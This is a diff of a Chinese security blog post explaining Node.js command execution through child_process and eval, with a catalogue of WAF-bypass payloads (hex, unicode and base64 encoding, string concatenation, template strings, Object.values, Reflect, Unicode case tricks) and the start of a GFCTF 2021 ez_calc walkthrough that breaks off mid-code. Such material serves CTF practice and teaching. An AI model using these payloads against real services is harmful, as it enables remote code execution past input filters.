@@ -19,15 +19,26 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"hllttz.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
 
-    <meta property="og:type" content="article">
+    <meta name="description" content="node.js命令执行的利用方式及bypass手段">
+<meta property="og:type" content="article">
 <meta property="og:title" content="node.js命令执行">
 <meta property="og:url" content="https://hllttz.github.io/2025/09/13/node-js%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="hllttz&#39;s blog">
+<meta property="og:description" content="node.js命令执行的利用方式及bypass手段">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250913144040899.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250913144200890.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250913151907069.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250913152527884.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250913153357283.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250913155035971.png">
+<meta property="og:image" content="https://hllttz.github.io/images/image-20250913155726436.png">
 <meta property="article:published_time" content="2025-09-13T04:46:48.000Z">
-<meta property="article:modified_time" content="2025-09-13T04:46:48.603Z">
+<meta property="article:modified_time" content="2025-09-13T07:59:19.039Z">
 <meta property="article:author" content="hllttz">
+<meta property="article:tag" content="node.js 命令执行">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hllttz.github.io/images/image-20250913144040899.png">
 
 
 <link rel="canonical" href="https://hllttz.github.io/2025/09/13/node-js%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
@@ -100,7 +111,7 @@
 
 
 <nav class="site-nav">
-  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">4</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">5</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">5</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">4</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">5</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>日程表</a></li>
   </ul>
 </nav>
 
@@ -112,7 +123,7 @@
   
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -125,6 +136,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#node-js%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">1.</span> <span class="nav-text">node.js中的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#child-process"><span class="nav-number">1.1.</span> <span class="nav-text">child_process</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#node-js%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87"><span class="nav-number">2.</span> <span class="nav-text">node.js中的命令绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-number">2.1.</span> <span class="nav-text">编码绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87"><span class="nav-number">2.2.</span> <span class="nav-text">拼接绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-number">2.3.</span> <span class="nav-text">模板字符串</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8B%BC%E6%8E%A5%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%B1%87%E6%80%BB"><span class="nav-number">2.3.1.</span> <span class="nav-text">${}拼接的字符串汇总</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Obejct-keys"><span class="nav-number">2.4.</span> <span class="nav-text">Obejct.keys</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%B0%84"><span class="nav-number">2.5.</span> <span class="nav-text">反射</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%B8%AD%E6%8B%AC%E5%8F%B7%E7%9A%84%E6%83%85%E5%86%B5"><span class="nav-number">2.6.</span> <span class="nav-text">过滤中括号的情况</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7"><span class="nav-number">3.</span> <span class="nav-text">javascript大小写特性</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">例题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GFCTF-2021-ez-calc"><span class="nav-number">4.1.</span> <span class="nav-text">[GFCTF 2021]ez_calc</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -148,7 +160,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -189,7 +201,7 @@
 
     <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
       <meta itemprop="name" content="node.js命令执行 | hllttz's blog">
-      <meta itemprop="description" content="">
+      <meta itemprop="description" content="node.js命令执行的利用方式及bypass手段">
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
@@ -203,8 +215,18 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">发表于</span>
+      
 
-      <time title="创建时间：2025-09-13 12:46:48" itemprop="dateCreated datePublished" datetime="2025-09-13T12:46:48+08:00">2025-09-13</time>
+      <time title="创建时间：2025-09-13 12:46:48 / 修改时间：15:59:19" itemprop="dateCreated datePublished" datetime="2025-09-13T12:46:48+08:00">2025-09-13</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/node-js/" itemprop="url" rel="index"><span itemprop="name">node.js</span></a>
+        </span>
     </span>
 
   
@@ -213,24 +235,193 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>0</span>
+      <span>11k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>1 分钟</span>
+      <span>10 分钟</span>
     </span>
 </div>
 
+            <div class="post-description">node.js命令执行的利用方式及bypass手段</div>
         </div>
       </header>
 
     
     
     
-    <div class="post-body" itemprop="articleBody">
+    <div class="post-body" itemprop="articleBody"><h1 id="node-js中的命令执行"><a href="#node-js中的命令执行" class="headerlink" title="node.js中的命令执行"></a>node.js中的命令执行</h1><h2 id="child-process"><a href="#child-process" class="headerlink" title="child_process"></a>child_process</h2><p>首先介绍一下nodejs中用来执行系统命令的模块<code>child_process</code>。Nodejs通过使用child_process模块来生成多个子进程来处理其他事物。在child_process中有七个方法它们分别为：execFileSync、spawnSync,execSync、fork、exec、execFile、以及spawn,而这些方法使用到的都是spawn()方法。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">exec</span>(<span class="string">&quot;sleep 3&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;sleep 3&quot;</span>);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFile</span>(<span class="string">&quot;/bin/sleep&quot;</span>,[<span class="string">&quot;3&quot;</span>]); <span class="comment">//调用某个可执行文件，在第二个参数传args</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawn</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]);</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execFileSync</span>(<span class="string">&#x27;sleep&#x27;</span>, [<span class="string">&#x27;3&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>正常的node.js命令执行:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;sleep 3&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>动态的一种绕过某些限制（比如模块缓存或包管理器的限制）的方法</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&quot;child_process&quot;</span>).<span class="title function_">execSync</span>(<span class="string">&quot;curl 127.0.0.1:1234&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其中,<code>global.process.mainModule.constructor._load</code>来动态导入<code>child_process</code>模块</p>
+<p>node.js中如何访问属性</p>
+<ol>
+<li><p>用<code>.</code>访问对象的属性</p>
+</li>
+<li><p>用<code>[]</code>访问属性</p>
+</li>
+</ol>
+<p>以下是一个简单的代码示例:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">true</span> &#125;))</span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span> (<span class="params">req, res</span>) &#123;</span><br><span class="line">    code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(code);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="built_in">eval</span>(code));</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>)</span><br></pre></td></tr></table></figure>
+
+<p>原理很简单，就是接受<code>post</code>方式传过来的code参数，然后返回<code>eval(code)</code>的结果。可以用以下的payload来rce</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&#x27;require(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h1 id="node-js中的命令绕过"><a href="#node-js中的命令绕过" class="headerlink" title="node.js中的命令绕过"></a>node.js中的命令绕过</h1><p>参考:<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/237032#h2-0">https://www.anquanke.com/post/id/237032#h2-0</a></p>
+<h2 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h2><ol>
+<li><p>16进制绕过 <code>\x61</code></p>
+<p>第一种思路是16进制编码，原因是在<code>nodejs</code>中，如果在字符串内用16进制，和这个16进制对应的ascii码的字符是等价的</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;a&quot;</span>===<span class="string">&quot;\x61&quot;</span>);</span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>
+
+<p>但是在正则匹配的时候，16进制却不会转化成字符，所以就可以绕过正则的校验。所以可以传</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;exe\x63Sync&quot;</span>](<span class="string">&quot;curl 127.0.0.1:1234&quot;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>unicode编码绕过 ”反斜杠+u+码点” <code>\u0061</code></p>
+<p>思路跟上面是类似的，由于<code>JavaScript</code>允许直接用码点表示Unicode字符，写法是”反斜杠+u+码点”，所以我们也可以用一个字符的unicode形式来代替对应字符。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\u0061&quot;</span>===<span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="comment">// true</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&quot;exe\u0063Sync&quot;</span>](<span class="string">&quot;curl 127.0.0.1:1234&quot;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>base64编码绕过</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="title class_">Buffer</span>.<span class="title function_">from</span>(<span class="string">&#x27;Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=&#x27;</span>,<span class="string">&#x27;base64&#x27;</span>).<span class="title function_">toString</span>())</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>这些都是对字符操作，就是 被引号或者反引号包裹起来的字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;</span><br><span class="line">&#x27;&#x27;</span><br><span class="line">``</span><br></pre></td></tr></table></figure>
+
+<h2 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h2><ol>
+<li><p>加号<code>+</code>拼接</p>
+<p>原理很简单，加号在js中可以用来连接字符，所以可以这样</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&#x27;exe&#x27;</span>%2b<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>concat拼接</p>
+<p>利用js中的concat函数连接字符串</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;)</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="模板字符串"><a href="#模板字符串" class="headerlink" title="模板字符串"></a>模板字符串</h2><p><strong>nodejs中 &#96;&#96; 等价于 引号</strong></p>
+<p>比较特殊的是占位符 <code>$&#123;expression&#125;</code> 可以镶套变量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`$&#123;&#125;`被``包裹</span><br></pre></td></tr></table></figure>
+
+<h3 id="拼接的字符串汇总"><a href="#拼接的字符串汇总" class="headerlink" title="${}拼接的字符串汇总"></a><code>$&#123;&#125;</code>拼接的字符串汇总</h3><p>这里总结一下<code>$&#123;&#125;</code>拼接的字符串，以便<strong>快速使用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">process     	`$&#123;`$&#123;`proce`&#125;ss`&#125;`</span><br><span class="line">prototype		`$&#123;`$&#123;`prototyp`&#125;e`&#125;`</span><br><span class="line">get_process		`$&#123;`$&#123;`get_pro`&#125;cess`&#125;`</span><br><span class="line">require			`$&#123;`$&#123;`requir`&#125;e`&#125;`</span><br><span class="line">execSync		`$&#123;`$&#123;`exe`&#125;cSync`&#125;`</span><br><span class="line">return process	`$&#123;`$&#123;`return proc`&#125;ess`&#125;`</span><br><span class="line">constructor		`$&#123;`$&#123;`constructo`&#125;r`&#125;`</span><br><span class="line">child_process	`$&#123;`$&#123;`child_proces`&#125;s`&#125;`</span><br></pre></td></tr></table></figure>
+
+<p>例如:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">`<span class="subst">$&#123;<span class="string">`<span class="subst">$&#123;<span class="string">`exe`</span>&#125;</span>cSync`</span>&#125;</span>`</span>](<span class="string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="Obejct-keys"><a href="#Obejct-keys" class="headerlink" title="Obejct.keys"></a>Obejct.keys</h2><p>实际上通过<code>require</code>导入的模块是一个<code>Object</code>，所以就可以用<code>Object</code>中的方法来操作获取内容。利用<code>Object.values</code>就可以拿到<code>child_process</code>中的各个函数方法，<code>Object.values(obj)</code> 会返回对象中 <strong>值的数组</strong>，再通过数组下标就可以拿到<code>execSync</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">values</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>))[<span class="number">5</span>](<span class="string">&#x27;curl 127.0.0.1:1234&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>等价于nodejs中的命令执行</p>
+<h2 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h2><p><strong>可以进行模糊调用，实际作用比不上模板字符串</strong></p>
+<p>通过<code>Reflect</code>这个关键字来实现反射调用函数的方式</p>
+<p>要得到<code>eval</code>函数，可以首先通过<code>Reflect.ownKeys(global)</code>拿到所有函数，然后<code>global[Reflect.ownKeys(global).find(x=&gt;x.includes(&#39;eval&#39;))]</code>即可得到eval</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>)) <span class="comment">//返回所有函数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">global</span>[<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;eval&#x27;</span>))])<span class="comment">//得到eval</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250913144040899.png" alt="image-20250913144040899"></p>
+<p>替换成:</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">global</span>[<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">includes</span>(<span class="string">&#x27;ev&#x27;</span>))])</span><br></pre></td></tr></table></figure>
+
+<p>也是可以的</p>
+<p><img src="/images/image-20250913144200890.png" alt="image-20250913144200890"></p>
+<p>也可以替换为</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">global</span>[<span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span>=&gt;</span>x.<span class="title function_">startsWith</span>(<span class="string">&#x27;eva&#x27;</span>))])注意不是startswith</span><br></pre></td></tr></table></figure>
+
+<h2 id="过滤中括号的情况"><a href="#过滤中括号的情况" class="headerlink" title="过滤中括号的情况"></a>过滤中括号的情况</h2><p>获取到eval的方式是通过<code>global</code>数组，其中用到了中括号<code>[]</code>，假如中括号被过滤，可以用<code>Reflect.get</code>来绕</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">get</span>(target, propertyKey[, receiver])<span class="comment">//作用是获取对象身上某个属性的值，类似于target[name]</span></span><br></pre></td></tr></table></figure>
+
+<p>可以拿对象的属性,执行任意命令</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Reflect</span>.<span class="title function_">get</span>(<span class="variable language_">global</span>, <span class="title class_">Reflect</span>.<span class="title function_">ownKeys</span>(<span class="variable language_">global</span>).<span class="title function_">find</span>(<span class="function"><span class="params">x</span> =&gt;</span> x.<span class="title function_">includes</span>(<span class="string">&#x27;eva&#x27;</span>)))(<span class="string">&quot;console.log(\&quot;123\&quot;);&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>解释一下这段代码:</p>
+<ol>
+<li><code>Reflect.ownKeys(global)</code></li>
+</ol>
+<ul>
+<li>获取 <code>global</code> 对象的 <strong>所有自有属性的 key</strong>（包括不可枚举属性）。</li>
+<li>在 Node.js 里，<code>global</code> 相当于浏览器的 <code>window</code>，里面有各种全局函数和对象。</li>
+<li>其中有一个关键属性就是 <code>eval</code>（全局的代码执行函数）。</li>
+</ul>
+<ol start="2">
+<li><code>.find(x =&gt; x.includes(&#39;eva&#39;))</code></li>
+</ol>
+<ul>
+<li>遍历所有 key，找第一个包含 <code>&#39;eva&#39;</code> 的名字。</li>
+<li>正好会匹配到 <code>&quot;eval&quot;</code>。</li>
+</ul>
+<ol start="3">
+<li><code>Reflect.get(global, &quot;eval&quot;)</code></li>
+</ol>
+<ul>
+<li><p>从 <code>global</code> 对象里取出 <code>eval</code> 函数。</p>
+</li>
+<li><p>等价于 <code>global.eval</code>。</p>
+</li>
+</ul>
+<ol start="4">
+<li>调用结果:</li>
+</ol>
+<ul>
+<li>执行<code>eval(&quot;console.log(\&quot;123\&quot;);&quot;);</code></li>
+</ul>
+<h1 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h1><p>在javascript中有几个特殊的字符需要记录一下</p>
+<p>对于toUpperCase():</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure>
+
+<p>对于toLowerCase():</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure>
+
+<p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>
+<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="GFCTF-2021-ez-calc"><a href="#GFCTF-2021-ez-calc" class="headerlink" title="[GFCTF 2021]ez_calc"></a>[GFCTF 2021]ez_calc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(req.<span class="property">body</span>.<span class="property">username</span>.<span class="title function_">toLowerCase</span>() !== <span class="string">&#x27;admin&#x27;</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">username</span>.<span class="title function_">toUpperCase</span>() === <span class="string">&#x27;ADMIN&#x27;</span> &amp;&amp; req.<span class="property">body</span>.<span class="property">passwd</span> === <span class="string">&#x27;admin123&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">        <span class="comment">// 登录成功，设置 session</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>username设置成<code>admın</code>password设置成<code>admin123</code></p>
+<p>登录后得到源码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = req.<span class="property">body</span>.<span class="property">calc</span>;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.<span class="property">split</span><span class="string">``</span>.<span class="title function_">some</span>(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span 